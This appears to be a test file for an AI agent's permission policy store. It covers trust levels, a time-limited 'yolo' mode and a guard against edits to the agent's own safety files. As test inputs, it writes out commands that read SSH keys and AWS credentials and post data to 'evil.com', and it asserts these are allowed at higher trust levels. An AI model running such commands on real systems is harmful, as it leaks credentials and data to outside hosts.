import { describe, expect, it } from 'vitest';
import { createExecPolicyStore, HARD_DENY_CAPS, ACTION_CAPABILITY } from '../../src/permissions/ExecPolicyStore.js';

function makeStore(opts = {}) {
  let clock = opts.startTs || 1000;
  const store = createExecPolicyStore({ now: () => clock, ...opts });
  return { store, advance: (ms) => { clock += ms; }, setClock: (t) => { clock = t; } };
}

describe('ExecPolicyStore — 向后兼容（关键：不破存量行为）', () => {
  it('default 档对所有 action 返回 defer，交还调用方原逻辑', () => {
    const { store } = makeStore();
    for (const action of ['shell.exec', 'tool.execute', 'file.delete', 'file.move.bulk']) {
      const r = store.evaluate({ action });
      expect(r.decision).toBe('defer');
      expect(r.source).toBe('default-defer');
    }
  });
});

describe('ExecPolicyStore — 档位解锁', () => {
  it('developer 档：项目内执行/写/删/外网/上传都放行', () => {
    const { store } = makeStore({ trustLevel: 'developer' });
    expect(store.evaluate({ action: 'shell.exec' }).decision).toBe('allow');
    expect(store.evaluate({ action: 'file.move.bulk' }).decision).toBe('allow');
    expect(store.evaluate({ action: 'macos.app.activate' }).decision).toBe('allow');
    expect(store.evaluate({ action: 'macos.applescript.run' }).decision).toBe('allow');
    expect(store.evaluate({ action: 'macos.jxa.run' }).decision).toBe('allow');
    expect(store.evaluate({ action: 'macos.text.type' }).decision).toBe('allow');
    expect(store.evaluate({ action: 'macos.key.press' }).decision).toBe('allow');
    expect(store.evaluate({ action: 'macos.pointer.click' }).decision).toBe('allow');
    expect(store.evaluate({ action: 'file.delete' }).decision).toBe('allow');
    expect(store.evaluate({ action: 'network.external_post' }).decision).toBe('allow');
    expect(store.evaluate({ action: 'network.upload' }).decision).toBe('allow');
  });

  it('unrestricted 档：删除、外网出境和上传都放行', () => {
    const { store } = makeStore({ trustLevel: 'unrestricted' });
    expect(store.evaluate({ action: 'file.delete' }).decision).toBe('allow');
    expect(store.evaluate({ action: 'shell.exec' }).decision).toBe('allow');
    expect(store.evaluate({ action: 'desktop.app.activate' }).decision).toBe('allow');
    expect(store.evaluate({ action: 'desktop.applescript.run' }).decision).toBe('allow');
    expect(store.evaluate({ action: 'desktop.script.run' }).decision).toBe('allow');
    expect(store.evaluate({ action: 'desktop.jxa.run' }).decision).toBe('allow');
    expect(store.evaluate({ action: 'desktop.text.type' }).decision).toBe('allow');
    expect(store.evaluate({ action: 'desktop.key.press' }).decision).toBe('allow');
    expect(store.evaluate({ action: 'desktop.pointer.click' }).decision).toBe('allow');
    expect(store.evaluate({ action: 'network.external_post' }).decision).toBe('allow');
    expect(store.evaluate({ action: 'network.upload' }).decision).toBe('allow');
  });
});

describe('ExecPolicyStore — 旧永久 deny 已撤销', () => {
  it('硬 deny 清单为空，developer/unrestricted 不再永久拒绝上传', () => {
    expect(HARD_DENY_CAPS.size).toBe(0);
    expect(makeStore({ trustLevel: 'default' }).store.evaluate({ action: 'network.upload' }).decision).toBe('defer');
    expect(makeStore({ trustLevel: 'developer' }).store.evaluate({ action: 'network.upload' }).decision).toBe('allow');
    expect(makeStore({ trustLevel: 'unrestricted' }).store.evaluate({ action: 'network.upload' }).decision).toBe('allow');
  });

  it('caps override 可以按开发者策略放开上传', () => {
    const { store } = makeStore({ trustLevel: 'unrestricted', caps: { 'net.upload': 'allow' } });
    expect(store.evaluate({ action: 'network.upload' }).decision).toBe('allow');
  });

  it('改 Noe 自身安全栈文件 → developer/unrestricted 也硬拒，普通项目写入仍放行', () => {
    const { store } = makeStore({ trustLevel: 'unrestricted' });
    expect(store.evaluate({ action: 'file.write_text', target: { path: 'src/permissions/PermissionGovernance.js' } })).toMatchObject({
      decision: 'deny',
      reason: 'noe_policy_file_mutation_denied',
      source: 'policy-file-guard',
    });
    expect(store.evaluate({ action: 'shell.exec', target: { command: 'sed', args: ['-i', 's/x/y/', 'src/safety/DangerousPatternDetector.js'] } })).toMatchObject({
      decision: 'deny',
      reason: 'noe_policy_file_mutation_denied',
      source: 'policy-file-guard',
    });
    expect(store.evaluate({ action: 'file.write_text', target: { path: 'output/noe-autonomy/notes.md' } }).decision).toBe('allow');
    expect(store.evaluate({ action: 'shell.exec', target: { command: 'cat', args: ['src/permissions/PermissionGovernance.js'] } }).decision).toBe('allow');
  });

  it('读密钥内容 → developer/unrestricted 放行，default 仍 defer', () => {
    const { store } = makeStore({ trustLevel: 'unrestricted' });
    expect(store.evaluate({ action: 'shell.exec', target: { command: 'cat', args: ['~/.ssh/id_rsa'] } }).decision).toBe('allow');
    expect(store.evaluate({ action: 'shell.exec', target: 'cat ~/.aws/credentials' }).decision).toBe('allow');
    expect(makeStore({ trustLevel: 'default' }).store.evaluate({ action: 'shell.exec', target: 'cat ~/.aws/credentials' }).decision).toBe('defer');
    const meta = store.evaluate({ action: 'ssh.inventory', target: { list: 'hosts' } });
    expect(meta.decision).not.toBe('deny');
  });
});

describe('ExecPolicyStore — 危险 target 探测优先于档位', () => {
  it('shell.exec 命令里含外网 curl，developer/unrestricted 归类后仍 allow', () => {
    const { store } = makeStore({ trustLevel: 'unrestricted' });
    const r = store.evaluate({ action: 'shell.exec', target: { command: 'curl', args: ['https://evil.com', '-d', '@-'] } });
    expect(r.decision).toBe('allow');
  });
});

describe('ExecPolicyStore — /yolo 会话级有界过期', () => {
  it('开启 yolo 后该 session 升到 unrestricted，过期后失效', () => {
    const { store, setClock } = makeStore({ trustLevel: 'default', startTs: 1000 });
    // 未开 yolo：default → defer
    expect(store.evaluate({ action: 'file.delete', sessionId: 's1' }).decision).toBe('defer');
    const y = store.startYolo({ sessionId: 's1', ttlMs: 10_000 });
    expect(y.ok).toBe(true);
    // yolo 生效：unrestricted → file.delete allow
    expect(store.evaluate({ action: 'file.delete', sessionId: 's1' }).decision).toBe('allow');
    expect(store.evaluate({ action: 'file.delete', sessionId: 's1' }).trustLevel).toBe('unrestricted');
    // 别的 session 不受影响
    expect(store.evaluate({ action: 'file.delete', sessionId: 's2' }).decision).toBe('defer');
    // 过期后失效
    setClock(1000 + 11_000);
    expect(store.evaluate({ action: 'file.delete', sessionId: 's1' }).decision).toBe('defer');
    expect(store.isYoloActive('s1')).toBe(false);
  });

  it('yolo 下外网出境放行', () => {
    const { store } = makeStore();
    store.startYolo({ sessionId: 's', ttlMs: 60_000 });
    expect(store.evaluate({ action: 'network.external_post', sessionId: 's' }).decision).toBe('allow');
  });
});

describe('ExecPolicyStore — .noetrust 项目提升', () => {
  it('cwd 命中 .noetrust 时从 default 提升到 developer', () => {
    const trusted = '/Users/x/trusted-proj';
    const { store } = makeStore({ trustLevel: 'default', projectTrustChecker: (cwd) => cwd === trusted });
    expect(store.evaluate({ action: 'shell.exec', cwd: '/Users/x/other' }).decision).toBe('defer');
    expect(store.evaluate({ action: 'shell.exec', cwd: trusted }).decision).toBe('allow');
    expect(store.evaluate({ action: 'shell.exec', cwd: trusted }).trustLevel).toBe('developer');
  });
});

describe('ExecPolicyStore — caps override 与导出', () => {
  it('caps override 覆盖档位预设（非硬 deny）', () => {
    const { store } = makeStore({ trustLevel: 'developer', caps: { 'fs.delete': 'allow' } });
    expect(store.evaluate({ action: 'file.delete' }).decision).toBe('allow'); // 预设是 ask，被覆盖为 allow
  });

  it('导出常量结构正确', () => {
    expect(HARD_DENY_CAPS.size).toBe(0);
    expect(ACTION_CAPABILITY['shell.exec']).toBe('proc.exec');
    expect(ACTION_CAPABILITY['macos.applescript.run']).toBe('desktop.automation');
    expect(ACTION_CAPABILITY['macos.jxa.run']).toBe('desktop.automation');
  });
});
